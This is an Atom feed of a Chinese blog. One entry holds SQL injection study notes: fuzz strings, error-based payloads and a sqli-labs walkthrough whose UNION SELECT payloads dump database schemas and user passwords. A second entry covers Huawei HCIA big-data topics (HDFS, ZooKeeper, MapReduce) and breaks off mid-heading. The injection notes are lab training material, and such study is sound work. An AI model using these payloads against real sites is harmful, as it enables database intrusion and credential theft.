<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Chenci&#39;s blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-04-24T13:14:43.390Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>chenci</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SQL注入靶场sqli-labs</title>
    <link href="http://example.com/2022/04/24/SQL%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BAsqli-labs/"/>
    <id>http://example.com/2022/04/24/SQL%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BAsqli-labs/</id>
    <published>2022-04-24T06:56:30.000Z</published>
    <updated>2022-04-24T13:14:43.390Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。 在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）</p><h2 id="常见的注入点"><a href="#常见的注入点" class="headerlink" title="常见的注入点"></a>常见的注入点</h2><ul><li>GET&#x2F;POST&#x2F;PUT&#x2F;DELETE参数</li><li>X-Forwarded-For</li><li>文件名</li><li>4.1.2.2. Fuzz注入点</li><li>‘ &#x2F; “</li><li>1&#x2F;1</li><li>1&#x2F;0</li><li>and 1&#x3D;1</li><li>“ and “1”&#x3D;”1</li><li>and 1&#x3D;2 </li><li>or 1&#x3D;1</li><li>or 1&#x3D;</li><li>‘ and ‘1’&#x3D;’1</li><li>+ - ^ * % &#x2F;</li><li>&lt;&lt; &gt;&gt; || | &amp; &amp;&amp;</li><li>~</li><li>!</li><li>@</li><li>反引号执行</li></ul><h2 id="4-1-2-3-测试用常量"><a href="#4-1-2-3-测试用常量" class="headerlink" title="4.1.2.3. 测试用常量"></a>4.1.2.3. 测试用常量</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@@version</span><br><span class="line">@@servername</span><br><span class="line">@@language</span><br><span class="line">@@spid</span><br><span class="line">@@database</span><br><span class="line">@@user</span><br><span class="line">@@version_compile_os</span><br></pre></td></tr></table></figure><h2 id="测试列数"><a href="#测试列数" class="headerlink" title="测试列数"></a>测试列数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.xxx.com/index.asp?<span class="built_in">id</span>=12+union+select+null,null--</span><br></pre></td></tr></table></figure><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- select 1/0</span><br><span class="line">- select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a</span><br><span class="line">- extractvalue(1, concat(0x5c,(select user())))</span><br><span class="line">- updatexml(0x3a,concat(1,(select user())),1)</span><br><span class="line">- exp(~(SELECT * from(select user())a))</span><br><span class="line">- ST_LatFromGeoHash((select * from(select * from(select user())a)b))</span><br><span class="line">- GTID_SUBSET(version(), 1)</span><br></pre></td></tr></table></figure><h2 id="基于geometric的报错注入"><a href="#基于geometric的报错注入" class="headerlink" title="基于geometric的报错注入"></a>基于geometric的报错注入</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">- GeometryCollection((select * from (select * from(select user())a)b))</span><br><span class="line">- polygon((select * from(select * from(select user())a)b))</span><br><span class="line">- multipoint((select * from(select * from(select user())a)b))</span><br><span class="line">- multilinestring((select * from(select * from(select user())a)b))</span><br><span class="line">- LINESTRING((select * from(select * from(select user())a)b))</span><br><span class="line">- multipolygon((select * from(select * from(select user())a)b))</span><br><span class="line">其中需要注意的是，基于exp函数的报错注入在MySQL 5.5.49后的版本已经不再生效，具体可以参考这个 commit 95825f 。</span><br><span class="line">而以上列表中基于geometric的报错注入在这个 commit 5caea4 中被修复，在5.5.x较后的版本中同样不再生效。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><ul><li>;select 1</li></ul><h2 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h2><ul><li>–+</li><li>&#x2F;<em>xxx</em>&#x2F;</li><li>&#x2F;<em>!xxx</em>&#x2F;</li><li>&#x2F;<em>!50000xxx</em>&#x2F;</li></ul><h2 id="判断过滤规则"><a href="#判断过滤规则" class="headerlink" title="判断过滤规则"></a>判断过滤规则</h2><ul><li>是否有trunc</li><li>是否过滤某个字符</li><li>是否过滤关键字</li><li>slash和编码</li></ul><h2 id="获取信息"><a href="#获取信息" class="headerlink" title="获取信息"></a>获取信息</h2><ul><li>判断数据库类型<ul><li>and exists (select * from msysobjects ) &gt; 0 access数据库</li><li>and exists (select * from sysobjects ) &gt; 0 SQLServer数据库</li></ul></li><li>判断数据库表<ul><li>and exsits (select * from admin)</li></ul></li><li>版本、主机名、用户名、库名</li><li>表和字段<ul><li>确定字段数<ul><li>Order By </li><li>Select Into</li></ul></li><li>表名、列名</li></ul></li></ul><h2 id="测试权限"><a href="#测试权限" class="headerlink" title="测试权限"></a>测试权限</h2><ul><li>文件操作</li><li>读敏感文件</li><li>写shell </li><li>带外通道</li><li>网络请求</li></ul><p><a href="https://websec.readthedocs.io/zh/latest/vuln/sql/fuzz.html">原文</a></p><h1 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h1><h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><pre><code>基于错误的字符串/数字注入</code></pre><p>判断注入点为数字注入</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>= <span class="number">-1</span></span><br></pre></td></tr></table></figure><p>依次猜解字段数为3</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>= 1<span class="string">&#x27; order by  3 --+</span></span><br></pre></td></tr></table></figure><p><img src="/2022/04/24/SQL%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BAsqli-labs/img.png" alt="猜解字段数"></p><p>联合构造回显位,-1是让前面为假</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>= -1<span class="string">&#x27; union select 1,2,3 --+ </span></span><br></pre></td></tr></table></figure><p><img src="/2022/04/24/SQL%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BAsqli-labs/img_1.png" alt="回显位"></p><p>通过回显位查询用户名和数据库名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,user(),database() --+ </span></span><br></pre></td></tr></table></figure><p><img src="/2022/04/24/SQL%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BAsqli-labs/img_2.png" alt="回显位查询"></p><p>查询所有库名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">group_concat 分组</span></span><br><span class="line"><span class="string">schema_name 存储所有库信息的一个字段</span></span><br><span class="line"><span class="string">information_schema 存储所有库信息的一个库</span></span><br><span class="line"><span class="string">information_schema.schemata 存储所有库名的一个表 </span></span><br></pre></td></tr></table></figure><p><img src="/2022/04/24/SQL%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BAsqli-labs/img_3.png" alt="查询所有库名"></p><p>查询security数据库的所有表名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = &#x27;</span>security<span class="string">&#x27;) ,3 --+ </span></span><br></pre></td></tr></table></figure><p><img src="/2022/04/24/SQL%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BAsqli-labs/img_4.png" alt="查询表名"></p><p>查询users表的所有列</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name = &#x27;</span><span class="built_in">users</span><span class="string">&#x27;) ,3 --+ </span></span><br></pre></td></tr></table></figure><p><img src="/2022/04/24/SQL%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BAsqli-labs/img_5.png" alt="查询列名"></p><p>查询用户名和密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,(select group_concat(username) from security.users) ,(select group_concat(password) from security.users) --+ </span></span><br></pre></td></tr></table></figure><p><img src="/2022/04/24/SQL%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BAsqli-labs/img_6.png" alt="查询用户名和密码"></p><h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p>同 less1,是数值型注入不需要闭合</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1 union select 1,(select group_concat(username) from security.users) ,(select group_concat(password) from security.users) </span><br></pre></td></tr></table></figure><h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure><p>需要构造闭合 ‘)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27;) UNION SELECT 1,(select group_concat(username) from security.users ),database() --+</span></span><br></pre></td></tr></table></figure><h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>由 “ 引起的注入,构造闭合 “)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&quot;) UNION SELECT 1,(select group_concat(username) from security.users ),database() --+</span></span><br></pre></td></tr></table></figure><h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><p>源码 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure><p>由 ‘ 引起注入,但是无回显</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;sql注入&quot;&gt;&lt;a href=&quot;#sql注入&quot; class=&quot;headerlink&quot; title=&quot;sql注入&quot;&gt;&lt;/a&gt;sql注入&lt;/h1&gt;&lt;p&gt;SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。 在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）&lt;/p&gt;
&lt;h2 id=&quot;常见的注入点&quot;&gt;&lt;a href=&quot;#常见的注入点&quot; class=&quot;headerlink&quot; title=&quot;常见的注入点&quot;&gt;&lt;/a&gt;常见的注入点&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;GET&amp;#x2F;POST&amp;#x2F;PUT&amp;#x2F;DELETE参数&lt;/li&gt;
&lt;li&gt;X-Forwarded-For&lt;/li&gt;
&lt;li&gt;文件名&lt;/li&gt;
&lt;li&gt;4.1.2.2. Fuzz注入点&lt;/li&gt;
&lt;li&gt;‘ &amp;#x2F; “&lt;/li&gt;
&lt;li&gt;1&amp;#x2F;1&lt;/li&gt;
&lt;li&gt;1&amp;#x2F;0&lt;/li&gt;
&lt;li&gt;and 1&amp;#x3D;1&lt;/li&gt;
&lt;li&gt;“ and “1”&amp;#x3D;”1&lt;/li&gt;
&lt;li&gt;and 1&amp;#x3D;2 &lt;/li&gt;
&lt;li&gt;or 1&amp;#x3D;1&lt;/li&gt;
&lt;li&gt;or 1&amp;#x3D;&lt;/li&gt;
&lt;li&gt;‘ and ‘1’&amp;#x3D;’1&lt;/li&gt;
&lt;li&gt;+ - ^ * % &amp;#x2F;&lt;/li&gt;
&lt;li&gt;&amp;lt;&amp;lt; &amp;gt;&amp;gt; || | &amp;amp; &amp;amp;&amp;amp;&lt;/li&gt;
&lt;li&gt;~&lt;/li&gt;
&lt;li&gt;!&lt;/li&gt;
&lt;li&gt;@&lt;/li&gt;
&lt;li&gt;反引号执行&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;4-1-2-3-测试用常量&quot;&gt;&lt;a href=&quot;#4-1-2-3-测试用常量&quot; class=&quot;headerlink&quot; title=&quot;4.1.2.3. 测试用常量&quot;&gt;&lt;/a&gt;4.1.2.3. 测试用常量&lt;/h2&gt;</summary>
    
    
    
    <category term="笔记" scheme="http://example.com/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>华为HCIA</title>
    <link href="http://example.com/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/"/>
    <id>http://example.com/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/</id>
    <published>2022-04-20T06:28:15.000Z</published>
    <updated>2022-04-22T10:05:07.312Z</updated>
    
    <content type="html"><![CDATA[<h1 id="大数据概述-amp-解决办法"><a href="#大数据概述-amp-解决办法" class="headerlink" title="大数据概述&amp;解决办法"></a>大数据概述&amp;解决办法</h1><h2 id="大数据的特征（5v-1c）"><a href="#大数据的特征（5v-1c）" class="headerlink" title="大数据的特征（5v+1c）"></a>大数据的特征（5v+1c）</h2><ul><li>大量：数据量巨大，MB,GB,TB,PB</li><li>多样：数据类型多样，数据来源多样 数据来源：服务器日志、网站浏览信息、社交<br>结构化数据：表格数据 平台、摄像头信息<br>半结构化数据：网页html、xml<br>非结构化数据：视频、音频、图片、文字</li><li>高速：数据产生速度快、数据处理速度快</li><li>价值：价值密度低</li><li>准确：数据真实性</li><li>复杂：数据产生速度快、数据的类型多样等特征，导致做数据处理时处理过程变得很复杂</li></ul><h2 id="大数据处理流程"><a href="#大数据处理流程" class="headerlink" title="大数据处理流程"></a>大数据处理流程</h2><p>数据采集-&gt;数据预处理-&gt;数据存储-&gt;分析挖掘-&gt;数据可视化</p><h3 id="大数据任务类型"><a href="#大数据任务类型" class="headerlink" title="大数据任务类型"></a>大数据任务类型</h3><ul><li>IO密集型任务：大量输入输出请求的任务IO资源</li><li>计算密集型任务：有大量的计算要求，CPU资源</li><li>数据密集型任务：数据处理，并发数据处理</li></ul><h2 id="大数据的计算类型（数据处理类型）"><a href="#大数据的计算类型（数据处理类型）" class="headerlink" title="大数据的计算类型（数据处理类型）"></a>大数据的计算类型（数据处理类型）</h2><ul><li>批处理：一次处理一批量数据，处理的数据量大，但是延迟性高</li><li>流处理：一次处理一条数据，处理的数据量小，但是延迟性低</li><li>图处理：以图的形式展示数据，进行处理</li><li>查询分析计算：检索功能</li></ul><h2 id="大数据解决方案"><a href="#大数据解决方案" class="headerlink" title="大数据解决方案"></a>大数据解决方案</h2><p>Fusioninsight HD:部署在x86架构上<br>BigData pro:部署在ARM架构上<br>MapReduce Server（MRS）:部署华为云服务上</p><ul><li>高性能：支持自我研发的存储系统CarbonData</li><li>易运维：提供了可视化的管理界面</li><li>高安全：使用Kerborse &amp; Ldap实现认证管理和权限管理</li><li>低成本：按需购买，自定义配置底层架构性能</li></ul><h1 id="HDFS分布式文件系统"><a href="#HDFS分布式文件系统" class="headerlink" title="HDFS分布式文件系统"></a>HDFS分布式文件系统</h1><h2 id="HDFS-Hadoop分布式文件系统"><a href="#HDFS-Hadoop分布式文件系统" class="headerlink" title="HDFS (Hadoop分布式文件系统)"></a>HDFS (Hadoop分布式文件系统)</h2><ul><li>创建人:道格卡廷</li><li>起始原因:开发一个搜索引擎–&gt;存储问题(大量数据的存储)</li><li>google论文: GFS - google自身的分布式文件系统 <code>闭源</code></li></ul><h2 id="HDFS特性"><a href="#HDFS特性" class="headerlink" title="HDFS特性"></a>HDFS特性</h2><p>理论上HDFS存储可以无限扩展</p><ul><li>分布式:把多节点的存储系统结合为一一个整体对外提供服务(提高存储能力)</li><li>容错性:针对每个数据存储备份(默认3份)，备份存储分别存在不同的位置，如果备份或者数据有丢失，会再进行备份，保持一直都是3份</li><li>按块存储:块大小默认128M, 一个文件可以存储在多个块,<code>但是一个块只存储一个文件</code> <br><code>好处:数据丢失针对丢失的数据所属的块，只恢复当前块就可以</code></li><li>元数据:记录文件存储在哪些块,块存储在哪里等信息 <br>每个块都有一个元数据信息，并且元数据的大小是固定的150K</li></ul><h2 id="HDFS适用场景"><a href="#HDFS适用场景" class="headerlink" title="HDFS适用场景"></a>HDFS适用场景</h2><ul><li>可以做大文件</li><li>可以协助离线处理或批处理</li><li>流式数据访问机制</li></ul><h2 id="HDFS不适合做什么"><a href="#HDFS不适合做什么" class="headerlink" title="HDFS不适合做什么"></a>HDFS不适合做什么</h2><ul><li>不适合大量小文件存储</li><li>不适合做实时场景</li><li>不适合随机读写，可以做追加写</li></ul><h2 id="HDFS为什么不适合大量小文件存储"><a href="#HDFS为什么不适合大量小文件存储" class="headerlink" title="HDFS为什么不适合大量小文件存储"></a><code>HDFS为什么不适合大量小文件存储</code></h2><pre><code>(例: 10个文件，每个文件大小为20M)</code></pre><ol><li>10个文件需要使用10个块，并且每个块只是用了20M空间—&gt; 存储空间浪费</li><li>有10个元数据，元数据150K</li><li>寻址时间增长</li></ol><p>不适合随机读写，可以做追加写</p><h2 id="HDFS系统架构"><a href="#HDFS系统架构" class="headerlink" title="HDFS系统架构"></a>HDFS系统架构</h2><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img.png" alt="HDFS系统架构"></p><ul><li>Client (客户端) :用户接口，用户通过Client连接到组件</li><li>NameNode (名称节点，主节点) :管理DataNode,并且接收用户请求,分发任务，存储元数据信息</li><li>DataNode (数据节点，从节点) :实际处理用户请求，维护自己的Block和实际存储位置映射关系</li><li>Block (块) : 数据存储</li></ul><h2 id="HDFS单NameNode的问题"><a href="#HDFS单NameNode的问题" class="headerlink" title="HDFS单NameNode的问题"></a>HDFS单NameNode的问题</h2><ul><li>单名称节点故障:整个集群都无法使用—&gt;HA(主备配置)</li><li>单名称节点性能瓶颈问题:并发处理的任务量有限—-&gt;联邦机制</li></ul><h2 id="HDFS-HA特性-主备配置"><a href="#HDFS-HA特性-主备配置" class="headerlink" title="HDFS HA特性(主备配置)"></a>HDFS HA特性(主备配置)</h2><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_1.png" alt="HA特性"></p><ul><li>active节点:对外提供服务</li><li>standby节点:不断备份active节点的数据，<code>当active宕机,standby会成为新的active</code></li><li>zookeeper监测主节点的状态，一旦发现故障，zookeeper就通知备用节点成为新的主节点</li></ul><h2 id="HDFS的联邦机制"><a href="#HDFS的联邦机制" class="headerlink" title="HDFS的联邦机制"></a>HDFS的联邦机制</h2><pre><code>各个NN之间是相互隔离的，维护自己的命名空间</code></pre><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_2.png" alt="联邦机制"></p><h2 id="HDFS元数据持久化-主备同步"><a href="#HDFS元数据持久化-主备同步" class="headerlink" title="HDFS元数据持久化(主备同步)"></a>HDFS元数据持久化(主备同步)</h2><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_3.png" alt="元数据持久化"></p><ol><li>备节点会通知主节点新建一个Editlog.new文件， 从这之后的操作都记录在.new文件中</li><li>备节点从主节点拷贝Editlog、Fsimage文件(只有第一 次需要 下载Fsimage,后续同步使用本地的)</li><li>将两个文件进行合并，生成Fsimage.ckpt文件</li><li>备节点将Fsimage.ckpt上传到主节点上</li><li>主节点接收到Fsimage.ckpt恢复成Fsimage</li><li>把Editlog.new重命名Editlog</li></ol><h2 id="HDFS副本机制-3份"><a href="#HDFS副本机制-3份" class="headerlink" title="HDFS副本机制 (3份)"></a>HDFS副本机制 (3份)</h2><ul><li>存储副本规则:</li></ul><ol><li>第一份副本存放在同一节点中(传输最快,但是如果节点故障，副本也会丢失)</li><li>第二份副本存放在同一机架的不同节点上(如果整个机架故障，副本也会丢失)</li><li>第三分副本存放在不同机架的其他节点上</li></ol><ul><li>副本距离公式:<code>优先选择的是距离小的</code></li></ul><ol><li>同节点的距离为0</li><li>同一机架不同节点的距离为2</li><li>不同机架的节点距离为4</li></ol><h2 id="HDFS读取流程"><a href="#HDFS读取流程" class="headerlink" title="HDFS读取流程"></a>HDFS读取流程</h2><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_4.png" alt="读取流程"></p><ol><li>Client向NameNode发起读取请求</li><li>NameNode接收到请求，反馈对应的元数据信息给Client</li><li>Client接收到反馈请求对应的DataNode <code>(如果Client本地有数据，优先从本地读取)</code></li><li>DataNode接收到请求，反馈数据内容给Client</li><li>关闭读取流</li></ol><h2 id="HDFS写入流程"><a href="#HDFS写入流程" class="headerlink" title="HDFS写入流程"></a>HDFS写入流程</h2><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_5.png" alt="写入流程"></p><ol><li>Client向NameNode发出写入请求</li><li>NameNode接收到请求后生成该文件的元数据信息，反馈DataNode信息给Client</li><li>Client接收到DataNode信息之后，请求相对应的DataNode</li><li>Client提交文件写入到对应的DataNode</li><li>DataNode接收到写入请求，执行写入</li><li>Client写入第一-个节点后，由第一个节点写入第二个节点，第二个节点写入第三个节点</li><li>写入完成后反馈元数据信息给Client</li><li>关闭读取流，NameNode更新元数据信息</li></ol><h1 id="ZooKeeper"><a href="#ZooKeeper" class="headerlink" title="ZooKeeper"></a>ZooKeeper</h1><pre><code>分布式服务应用，可以帮助其他分布式组件协调管理集群</code></pre><h2 id="ZooKeeper的特性"><a href="#ZooKeeper的特性" class="headerlink" title="ZooKeeper的特性"></a>ZooKeeper的特性</h2><ul><li>分布式服务, ZooKeeper集群中有一半以上的节点存活集群才能正常运行</li><li>最终一致性:所有的节点对外提供的是同一个视图</li><li>实时性:实时获取、实时反馈应用状态</li><li>可靠性: 一条数据被-个节点接收到，就会被其他节点也接收</li><li>等待无关性:慢的或者失效的client请求，不会影响到其他客户端请求</li><li>原子性:最终状态只有成功或者失败</li></ul><h2 id="ZooKeeper集群主从选举-x2F-主备切换"><a href="#ZooKeeper集群主从选举-x2F-主备切换" class="headerlink" title="ZooKeeper集群主从选举&#x2F;主备切换"></a>ZooKeeper集群主从选举&#x2F;主备切换</h2><ul><li>选举: zookeeper内部投票选举,当节点得到一半以上的票数,它就会称为Leader,其他的节点都是Follower</li><li>主备切换:当leader出现故障,从其他的follower中重新选举新的leader</li></ul><h2 id="ZooKeeper的容灾能力"><a href="#ZooKeeper的容灾能力" class="headerlink" title="ZooKeeper的容灾能力"></a>ZooKeeper的容灾能力</h2><pre><code>(可容灾集群最低要求是3个节点)</code></pre><ul><li>在集群运行过程中允许发生故障的节点数(最大:节点数-半-1)</li><li>如:集群只要1个节点，容灾能力为0<br>  集群只要2个节点，容灾能力为0<br>  集群只要3个节点，容灾能力为1<br>  集群只要4个节点，容灾能力为1</li><li>搭建集群时，尽量选择奇数台节点进行搭建</li></ul><h2 id="ZooKeeper的读特性"><a href="#ZooKeeper的读特性" class="headerlink" title="ZooKeeper的读特性"></a>ZooKeeper的读特性</h2><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_6.png" alt="读特性"></p><ol><li>Client发起读取请求</li><li>获取到数据(不管接收请求的是Leader节点还是Follower节点)</li></ol><h2 id="ZooKeeper的写特性"><a href="#ZooKeeper的写特性" class="headerlink" title="ZooKeeper的写特性"></a>ZooKeeper的写特性</h2><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_7.png" alt="写特性"></p><ol><li>Client发起写入请求 如果请求到的节点不是leader节点，follower会把请求转发给leader</li><li>leader接收到请求后会向所有节点发出询问是否可以接收写入</li><li>节点接收到询问请求,根据自身情况反馈是否可写入的信息给leader</li><li>leader接收到一半以上的节点可以写入，再执行写入</li><li>写入完成后反馈给client,如果Client请求的不是leader, leader把写 入状态反馈给follower,由follower反馈给client</li></ol><h1 id="MapReduce"><a href="#MapReduce" class="headerlink" title="MapReduce"></a>MapReduce</h1><pre><code>数据处理(数据计算)创建者:道格卡廷出发点:搜索引擎--&gt;处理问题google: mapreduce论文MapReduce的特性:分布式计算</code></pre><h2 id="MapReduce的特性-分布式计算"><a href="#MapReduce的特性-分布式计算" class="headerlink" title="MapReduce的特性:分布式计算"></a>MapReduce的特性:分布式计算</h2><ul><li>高度抽象的编程思想:编程人员只需要描述做什么，具体怎么做交由处理框架执行的</li><li>可扩展性:分布式、搭建在集群上的一-个处理组件</li><li>高容错性:处理任务时节点故障，迁移到其他节点执行任务MapReduce任务主要分为两大部分: map任务、 reduce任务</li></ul><h2 id="MapReduce任务"><a href="#MapReduce任务" class="headerlink" title="MapReduce任务"></a>MapReduce任务</h2><ul><li>reduce任务的处理数据来源是map任务的输出</li><li>map阶段:针对每个数据执行一个操作, 提取数据特征</li><li>reduce阶段:获取到多个map的输出，统一计 算处理,针对key统计汇总这个key对应的value</li></ul><h2 id="Map阶段详情"><a href="#Map阶段详情" class="headerlink" title="Map阶段详情"></a>Map阶段详情</h2><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_8.png" alt="Map阶段详情"></p><ol><li>数据从数据源获取后进行分片切分、执行map操作</li><li>分片会被存储在环形内存缓冲区( 当缓冲区达到80%会发生溢写)</li><li>把分片溢写到磁盘中，生成MOF文件</li><li>溢写过程中对数据执行</li></ol><h2 id="Map阶段详情-1"><a href="#Map阶段详情-1" class="headerlink" title="Map阶段详情"></a>Map阶段详情</h2><p><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_9.png" alt="Reduce阶段详情"></p><ol><li>把数据(MOF)从磁盘中加载到内存中</li><li>当数据量过大会执行归并，如果不多，直接跳过归并执行归约操作</li><li>执行完reduce操作之后，最终结果写入到HDFS</li></ol><h2 id="词频统计案例-单词计数WordCount"><a href="#词频统计案例-单词计数WordCount" class="headerlink" title="词频统计案例(单词计数WordCount)"></a>词频统计案例(单词计数WordCount)</h2><ol><li>数据源(很多英文句子或短语的一个文件)</li><li>提取出每个单词,统计单词出现的次数<br><img src="/2022/04/20/%E5%8D%8E%E4%B8%BAHCIA/img_10.png" alt="词频统计案例"></li></ol><h2 id="MapReduce缺点"><a href="#MapReduce缺点" class="headerlink" title="MapReduce缺点"></a>MapReduce缺点</h2><ul><li>处理延迟性高</li><li>使用java语言编程map处理reduce处理</li><li>MapReduce处理任务需要使用资源</li></ul><h2 id="MapReduce-V1资源调度出现的问题"><a href="#MapReduce-V1资源调度出现的问题" class="headerlink" title="MapReduce V1资源调度出现的问题"></a>MapReduce 